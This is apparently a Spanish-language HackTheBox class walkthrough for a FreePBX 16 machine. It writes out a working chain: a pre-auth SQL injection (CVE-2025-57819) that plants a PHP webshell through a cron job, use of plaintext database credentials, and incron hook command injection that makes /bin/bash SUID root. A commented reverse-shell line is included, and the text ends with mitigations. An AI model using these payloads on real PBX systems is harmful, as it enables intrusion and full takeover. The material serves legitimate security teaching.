0Preparación del entorno

Antes de atacar, confirmamos conectividad con la VPN de HackTheBox.

bashatacante · kali
$ ping -c 2 10.129.152.158
64 bytes from 10.129.152.158: icmp_seq=1 ttl=63 time=190 ms

Qué hace cada parte

ping
Envía paquetes ICMP para ver si la máquina responde (está "viva").
-c 2
Limita a 2 paquetes y termina (si no, haría ping infinito).
ttl=63
Pista del SO: un TTL que llega a 63 suele venir de un valor inicial 64 (Linux) tras pasar 1 salto (el router de la VPN). Windows arrancaría en 128.
Nota de clase La IP 10.129.x.x es el rango típico de las máquinas de HackTheBox a través de la VPN. Todo el laboratorio está autorizado: solo atacamos objetivos para los que tenemos permiso.

RRequisitos y descargas

Buenas noticias: no hace falta descargar ningún exploit de terceros. Todo se hace con herramientas que ya trae Kali Linux. Lo único que "generamos" son dos cadenas de texto (un webshell en base64 y el nombre de fichero del hook), y eso lo hacemos nosotros mismos.

Herramientas (ya vienen en Kali)

Lo que usamos

openvpn
Para conectarte a la VPN de HackTheBox con tu fichero .ovpn (sudo openvpn lab.ovpn). Sin esto no hay conectividad con la máquina.
nmap
Escaneo de puertos y servicios.
curl
Toda la explotación (SQLi, webshell, comandos) se hace con curl. Nada de binarios raros.
python3
Solo para generar el nombre de fichero del hook de incron (módulos json, zlib, base64, todos de la librería estándar).
base64
Para codificar el webshell. Viene en todos los Linux (coreutils).

Lo único "a generar" (no se descarga nada)

bash · generar el webshell en base64atacante · kali
# Codificamos nuestro webshell PHP en base64 para meterlo en el SQL sin comillas problemáticas
$ echo -n '<?php system($_GET[cmd]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

Qué hace cada parte

echo -n '…'
Imprime el código del webshell sin salto de línea final (-n), para que el base64 salga limpio.
| base64
Codifica esa cadena. El resultado es lo que luego el cron de la víctima decodificará con base64 -d para crear webshell.php.
PoC públicos (opcional, NO necesario) Existen exploits "todo en uno" en GitHub para CVE-2025-57819 (p. ej. de jf-gondim o HexBytee). En clase hacemos el proceso a mano para entenderlo. Si alguna vez descargas un script de terceros: revísalo antes de ejecutarlo y lánzalo aislado (python3 -I exploit.py) — nunca ejecutes a ciegas código ajeno.

1Reconocimiento con nmap

Primero, qué puertos están abiertos. Hacemos dos pasadas: una rápida a todos los puertos y otra detallada a los que encontremos.

1.1 — Barrido completo de puertos

bashatacante · kali
$ nmap -p- --min-rate 2000 -T4 -oN allports.txt 10.129.152.158

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Qué hace cada parte

-p-
Escanea los 65535 puertos TCP, no solo los 1000 habituales. Así no se nos escapa nada.
--min-rate 2000
Envía al menos 2000 paquetes/segundo: acelera mucho el escaneo.
-T4
Plantilla de temporización "agresiva" (rápida). Va de T0 (sigiloso) a T5 (muy rápido).
-oN archivo
Guarda la salida en formato normal (output Normal) para consultarla luego.

1.2 — Versiones y scripts por defecto

bashatacante · kali
$ nmap -sC -sV -p22,80,443 10.129.152.158

22/tcp  open  ssh   OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http  Apache/2.4.6 (CentOS) ... PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 (CentOS)
| ssl-cert: Subject: commonName=pbxconnect/organizationName=...

Qué hace cada parte

-sV
Detecta la versión exacta de cada servicio (clave para buscar CVEs).
-sC
Lanza los scripts por defecto de nmap (NSE): títulos web, certificados, robots.txt…
-p22,80,443
Solo los puertos ya descubiertos, para ir rápido.
Pistas que extraemos El puerto 80 nos redirige a connected.htb (un virtual host) y el certificado TLS del 443 menciona pbxconnect. Ambas señales apuntan a un sistema de telefonía FreePBX / Asterisk.

2Enumeración web

Como el sitio usa el nombre connected.htb, el servidor sirve contenido distinto según la cabecera Host. Lo resolvemos sin tocar /etc/hosts usando --resolve de curl.

bashatacante · kali
$ curl -s -I --resolve connected.htb:80:10.129.152.158 http://connected.htb/
HTTP/1.1 302 Found
Location: /admin

$ curl -sk -L --resolve connected.htb:80:10.129.152.158 http://connected.htb/admin/ | grep -i freepbx
<title>FreePBX Administration</title> ... FreePBX 16.0.40.7 is licensed under the GPL

Qué hace cada parte

--resolve host:puerto:IP
Le dice a curl "cuando pidas connected.htb:80, usa esta IP". Equivale a editar /etc/hosts, pero temporal y sin permisos de root.
-s
Silent: oculta la barra de progreso.
-I
Pide solo las cabeceras (petición HEAD). Vemos el 302 → /admin.
-k
Insecure: acepta el certificado TLS autofirmado del 443 sin quejarse.
-L
Sigue las redirecciones (Location) hasta la página final.
| grep -i freepbx
Filtra la salida buscando "freepbx" sin distinguir mayúsculas (-i).
El hallazgo clave FreePBX 16.0.40.7. Esta versión es vulnerable a CVE-2025-57819: inyección SQL sin autenticación en el módulo endpoint, que se puede encadenar hasta ejecución remota de comandos (RCE).

3Foothold — CVE-2025-57819

La vulnerabilidad vive en /admin/ajax.php. Normalmente ese endpoint exige estar logueado y comprueba la cabecera Referer, pero si invocamos el módulo por su nombre de clase con namespace (FreePBX\modules\endpoint\ajax) se salta ese control. El parámetro brand se concatena directamente en una consulta SQL.

3.1 — Entendiendo el payload

Usamos una stacked query (consulta apilada): cerramos la cadena original con ', añadimos ; y nuestra propia sentencia INSERT, y comentamos el resto con -- (dos guiones y un espacio). Insertamos una tarea en la tabla cron_jobs, que FreePBX ejecuta cada minuto, para que escriba un webshell PHP en el directorio web.

payload SQL (lo que inyectamos en brand=)SQL
x' ;INSERT INTO cron_jobs
  (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)
VALUES ('sysadmin','webshell',
  'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64 -d >/var/www/html/webshell.php',
  NULL,'* * * * *',30,1,1) --

Anatomía del payload

x'
Cierra la comilla de la consulta original de FreePBX.
;
Termina esa consulta y permite apilar una nueva (stacked query).
INSERT INTO cron_jobs
Añade una fila a la tabla de tareas programadas de FreePBX.
command
El comando que ejecutará el cron. Decodifica un base64 y lo escribe como webshell.php.
PD9waHAg…Pg==
Es <?php system($_GET[cmd]); ?> en base64. Lo codificamos para evitar comillas problemáticas dentro del SQL.
'* * * * *'
El schedule cron: cada minuto.
enabled = 1
La tarea queda activa.
--
Comenta el resto de la consulta original para que no dé error de sintaxis. Ojo: el espacio final es obligatorio en MySQL.

3.2 — Enviando la inyección

bashatacante · kali
$ curl -sk -G --resolve connected.htb:443:10.129.152.158 \
    "https://connected.htb/admin/ajax.php" \
    --data-urlencode 'module=FreePBX\modules\endpoint\ajax' \
    --data-urlencode 'command=model' \
    --data-urlencode 'template=x' \
    --data-urlencode 'model=model' \
    --data-urlencode "brand=$PAYLOAD"

{"error":{... "file":"...\/modules\/endpoint\/views\/model.php","line":144}}
[HTTP 500]

Qué hace cada parte

-G
Fuerza el método GET y adjunta los --data-urlencode como parámetros de la URL (?a=b&c=d).
--data-urlencode
Codifica cada valor para la URL (espacios, comillas, barras…). Imprescindible porque el payload lleva caracteres especiales.
module=FreePBX\modules\endpoint\ajax
El truco: llamar al módulo por su clase con namespace salta el control de Referer y de autenticación.
brand=$PAYLOAD
Aquí va nuestra inyección SQL.
¿Un error 500 es malo? No. El HTTP 500 con el error en model.php:144 confirma que nuestra consulta llegó y se ejecutó: la aplicación revienta después de nuestro INSERT, al intentar usar un resultado que ya no existe. La fila maliciosa quedó insertada.

4Webshell y user flag

El cron de FreePBX corre cada minuto. Esperamos ~60 s y comprobamos si el webshell ya existe pidiéndole que ejecute id.

bashatacante · kali
$ curl -sk --resolve connected.htb:443:10.129.152.158 \
    "https://connected.htb/webshell.php?cmd=id"
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

Qué hace cada parte

webshell.php?cmd=id
Nuestro <?php system($_GET[cmd]);?> toma el parámetro cmd y lo ejecuta en el sistema. Aquí ejecuta id.
uid=999(asterisk)
Tenemos ejecución de comandos como el usuario asterisk (el que corre el servidor web/PBX). Ya estamos "dentro".

4.1 — Función cómoda para repetir comandos

Para no reescribir el curl entero cada vez, definimos una función de shell:

bashatacante · kali
# "sh " lanzará el comando en la víctima a través del webshell
sh() { curl -sk -G --resolve connected.htb:443:10.129.152.158 \
       "https://connected.htb/webshell.php" --data-urlencode "cmd=$1"; }

$ sh 'cat /home/asterisk/user.txt'

Qué hace cada parte

sh() { … }
Define una función de bash llamada sh.
"cmd=$1"
$1 es el primer argumento que le pasemos a la función. Así sh 'id' ejecuta id en la víctima.
--data-urlencode
Vuelve a codificar el comando para la URL (comandos con espacios o / funcionan sin romperse).
user.txt 5e05cd48732c4e88e907dbf86ab0d350

5Credenciales y enumeración local

Como usuario asterisk, buscamos credenciales. FreePBX guarda las de la base de datos en texto claro en sus ficheros de configuración.

webshell · víctimaasterisk
$ sh 'cat /etc/freepbx.conf'
$amp_conf["AMPDBUSER"] = "freepbxuser";
$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
$amp_conf["AMPDBNAME"] = "asterisk";

Qué obtenemos

AMPDBUSER / PASS
Usuario y contraseña de MySQL: freepbxuser:mZzDpAGKTmPJ. Nos da acceso total a la base de datos asterisk.
¿Por qué importa?
La escalada de privilegios dependerá de modificar una tabla de esa base de datos.

5.1 — Buscando qué corre como root

El objetivo ahora es encontrar algo que el usuario root ejecute y que nosotros (asterisk) podamos influir. Revisamos SUID, capabilities, cron e incron.

webshell · víctimaasterisk
$ sh 'cat /etc/incron.d/*'
/var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
/var/spool/asterisk/sysadmin/update_system_cron  IN_CLOSE_WRITE  /usr/sbin/sysadmin_update_set_cron
...

$ sh 'ls -ld /var/spool/asterisk/incron'
drwxrwxr-x. 2 asterisk asterisk /var/spool/asterisk/incron   # ¡escribible por nosotros!

El concepto: incron

incron
Es como cron, pero en vez de dispararse por tiempo se dispara por eventos de ficheros (crear, modificar, cerrar un archivo). El demonio incrond corre como root.
IN_CLOSE_WRITE
El evento "se escribió y cerró un fichero" en el directorio vigilado.
$#
incron sustituye esto por el nombre del fichero que disparó el evento, y se lo pasa al programa.
drwxrwxr-x asterisk
El directorio vigilado /var/spool/asterisk/incron nos pertenece: podemos crear ficheros dentro. Esa es la puerta a root.

6Escalada a root vía incron

Cuando creamos un fichero en /var/spool/asterisk/incron/, incrond (root) ejecuta /usr/bin/sysadmin_manager pasándole el nombre del fichero. Si ese nombre empieza por api.fwconsole-commands., sysadmin_manager decodifica el resto del nombre y lo ejecuta con fwconsole — y ahí hay inyección de comandos con ;.

La idea en una frase El nombre del fichero es el comando. Lo codificamos (JSON → zlib → base64) y, gracias a la inyección con ;, conseguimos que root ejecute lo que queramos. En vez de una reverse shell, le pedimos que ponga el bit SUID a /bin/bash.

6.1 — Generar el nombre de fichero malicioso

python3 · en nuestra kaliatacante · kali
import json, zlib, base64
cmd = "help; chmod u+s /bin/bash"
payload = base64.b64encode(
             zlib.compress(
                json.dumps([cmd, "txn"]).encode()
             )).decode().replace("/", "_")
print("/var/spool/asterisk/incron/api.fwconsole-commands." + payload)

# -> /var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkjOyM1PU...

Qué hace cada parte

cmd
help es un comando válido de fwconsole; el ; y lo que sigue es nuestra inyección: chmod u+s /bin/bash.
chmod u+s
Activa el bit SUID: a partir de ahí /bin/bash se ejecuta con los privilegios de su dueño (root), no los de quien lo lanza.
json.dumps([cmd,"txn"])
Formato exacto que espera el hook fwconsole-commands: una lista [comando, "txn"].
zlib.compress
Lo comprime (el hook espera datos comprimidos).
base64 + replace("/","_")
Lo codifica en base64 y sustituye / por _ porque el / no vale en un nombre de fichero.
api.fwconsole-commands.
Prefijo que le dice a sysadmin_manager qué hook usar (este hook no exige firma GPG, a diferencia de otros).

6.2 — Disparar el hook desde la víctima

webshell · víctimaasterisk
# estado antes:
$ sh 'ls -la /bin/bash'
-rwxr-xr-x. 1 root root 964536 /bin/bash

# creamos el fichero -> incrond (root) ejecuta el hook
$ sh "touch '/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzS...'"

# ~5 segundos después:
$ sh 'ls -la /bin/bash'
-rwsr-xr-x. 1 root root 964536 /bin/bash   # la 's' = SUID activo

Qué hace cada parte

touch '…'
Crea el fichero. El mero hecho de crearlo dispara el evento IN_CLOSE_WRITE que vigila incron.
-rwsr-xr-x
La s donde antes había una x en los permisos del dueño indica que el bit SUID está puesto. Lo hizo root por nosotros.
¿Por qué ~5 s?
incron reacciona casi al instante al evento (no espera al minuto como cron).

6.3 — Convertirnos en root

webshell · víctimaroot
$ sh 'bash -p -c "id"'
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)

Qué hace cada parte

bash -p
La opción -p (privileged) evita que bash "deje caer" los privilegios SUID al arrancar. Sin ella, bash bajaría el euid a asterisk por seguridad.
-c "id"
Ejecuta el comando que le demos. Si no pusiéramos -c, abriría una shell interactiva.
euid=0(root)
El euid (ID efectivo) es 0 = root. Ya mandamos en la máquina.

A.3 — Generar el nombre de fichero del hook

gen_hook.pyatacante · kali
#!/usr/bin/env python3
import json, zlib, base64

# Opción 1 (recomendada en clase): SUID bash, sin listener
cmd = "help; chmod u+s /bin/bash"

# Opción 2: reverse shell  ->  cmd = f"help; bash -i >& /dev/tcp/LHOST/LPORT 0>&1"

payload = base64.b64encode(
             zlib.compress(json.dumps([cmd, "txn"]).encode())
          ).decode().replace("/", "_")
print("/var/spool/asterisk/incron/api.fwconsole-commands." + payload)
bashatacante · kali

8Lecciones y mitigación

Lo importante de una máquina no es la flag, sino entender por qué funcionó cada paso y cómo se habría evitado.

FalloPor qué ocurreMitigación
SQLi pre-auth (CVE-2025-57819) El parámetro brand se concatena en la consulta sin parametrizar, y el namespace evita el control de autenticación. Parchear FreePBX (16 ≥ 16.0.89). Usar consultas preparadas. No exponer /admin a Internet.
Credenciales en claro /etc/freepbx.conf guarda la contraseña de MySQL legible por asterisk. Permisos estrictos y, cuando sea posible, autenticación por socket en vez de contraseña.
Directorio incron escribible Un demonio que corre como root actúa sobre ficheros que un usuario sin privilegios controla. No ejecutar hooks root sobre rutas escribibles por servicios. Validar/firmar siempre la entrada (como sí hace el hook GPG).
Inyección de comandos en el hook El nombre del fichero se pasa a fwconsole sin sanear, permitiendo ;. Lista blanca de comandos; nunca construir una orden de shell a partir de entrada no confiable.
Resumen de la cadena nmap (FreePBX 16) → SQLi en endpoint → INSERT en cron_jobs → webshell como asterisk → fichero en incron → sysadmin_manager ejecuta como root → /bin/bash SUID → bash -p → root.
Aviso ético Todas estas técnicas son para el laboratorio autorizado de HackTheBox o entornos propios. Ejecutarlas contra sistemas sin permiso explícito es ilegal.
